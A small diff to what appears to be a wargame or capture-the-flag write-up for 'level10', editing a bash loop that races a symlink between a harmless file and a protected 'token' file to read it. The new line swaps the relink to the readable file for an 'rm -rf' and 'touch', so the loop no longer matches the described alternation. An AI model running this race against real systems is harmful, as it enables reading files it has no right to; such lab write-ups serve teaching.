@@ -57,7 +57,7 @@ Rapidly alternate the symlink `myFile` between a readable file (`otherFile`, own
 
 ```bash
 while true; do
-    ln -sf /home/user/level10/otherFile myFile
+    rm -rf myFile && touch myFile
     ln -sf /home/user/level10/token myFile
 done
 ```
